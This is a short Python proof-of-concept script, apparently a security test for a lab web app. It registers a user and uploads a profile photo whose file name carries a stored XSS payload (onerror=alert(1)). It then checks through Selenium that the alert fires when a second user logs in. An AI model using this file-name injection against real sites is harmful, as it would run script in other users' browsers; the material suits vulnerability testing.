import requests, sys, os, random, ntpath
import time
from selenium_utils import start_driver, write_to_field

SERVER = sys.argv[1]
FILE_PATH = 'Resources/picture.jpg'

session = requests.session()

r = session.post(SERVER + '/init')

# Random user credentials 
user = str(random.randint(2**27, 2**28))
password = str(random.randint(2**27, 2**28))

# Registration of the user
params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/register', data=params)

# Login of the user
params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/login', data=params, cookies=session.cookies)

# Renaming the image with the payload
payload = FILE_PATH.split('.')[0] + ' onerror=alert(1).' + FILE_PATH.split('.')[1]
os.rename(FILE_PATH, payload)
newFileName =  ntpath.basename(payload)

# Updating the profile
files ={'photo': (newFileName, open(payload,'rb'),'application/octet-stream')}
data = {'username': 'qwerty', 'name': '', 'currentpassword': password, 'newpassword': '', 'about': 'asdfsdfsdf'}
r = requests.post(SERVER+'/update_profile', data=data, files=files, cookies=session.cookies)

# Renaming the image to its original name
os.rename(payload, FILE_PATH)

# Create a new post
params = {'content' : 'MY PHOTO IS MALICIOUS', 'type' : 'Public'}
r = session.post(SERVER + '/create_post', data=params, cookies=session.cookies)

# Verify

# Random user credentials 
user = str(random.randint(2**27, 2**28))
password = str(random.randint(2**27, 2**28))

# Registration of the user
params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/register', data=params)


driver = start_driver()
driver.get(SERVER)

# Login
write_to_field(driver, 'username', user)
write_to_field(driver, 'password', password + '\n')

alert = driver.switch_to.alert
time.sleep(1)
assert "1" in alert.text
alert.accept()